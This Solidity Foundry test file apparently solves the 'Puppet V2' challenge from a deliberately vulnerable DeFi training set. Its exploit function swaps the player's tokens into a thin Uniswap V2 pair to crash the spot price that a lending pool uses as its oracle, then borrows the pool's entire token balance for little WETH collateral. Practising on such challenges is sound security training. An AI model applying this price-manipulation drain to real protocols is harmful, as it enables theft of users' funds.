// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH9} from "../../src/WETH9.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../src/puppet-v2/Interfaces.sol";

contract PuppetV2Test is Test {
    address public deployer;
    address public player;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal token;
    WETH9 internal weth;
    PuppetV2Pool internal puppetV2pool;

    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 PLAYER_INITIAL_ETH_BALANCE = 20e18;

    uint256 POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        // vm.startPrank(deployer);
        token = new DamnValuableToken();
        weth = new WETH9();

        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_ETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0,
            deployer,
            DEADLINE
        );

        // get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        //deploy the lending pool
        puppetV2pool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Pair), address(uniswapV2Factory));

        // detup initial token balances of pool and attacker account
        token.transfer(address(puppetV2pool), POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);

        assertEq(puppetV2pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(puppetV2pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);
        // vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);

        // approve the router for the tokens
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        emit log("before");
        emit log_named_decimal_uint("token", token.balanceOf(player), 18);
        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
        emit log_named_decimal_uint("eth", address(player).balance, 18);
        uint256 beforeCollateral = puppetV2pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("collateral", beforeCollateral, 18);
        // swap tokens for WETH
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, DEADLINE);
        emit log("after");
        emit log_named_decimal_uint("token", token.balanceOf(player), 18);
        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
        emit log_named_decimal_uint("eth", address(player).balance, 18);

        // calculate deposit required
        uint256 afterCollateral = puppetV2pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("collateral", afterCollateral, 18);
        weth.deposit{value: player.balance}();
        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
        weth.approve(address(puppetV2pool), afterCollateral);
        puppetV2pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        emit log("after hack");
        emit log_named_decimal_uint("token", token.balanceOf(player), 18);
        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
        emit log_named_decimal_uint("eth", address(player).balance, 18);

        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();
        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(puppetV2pool)), 0);
    }
}
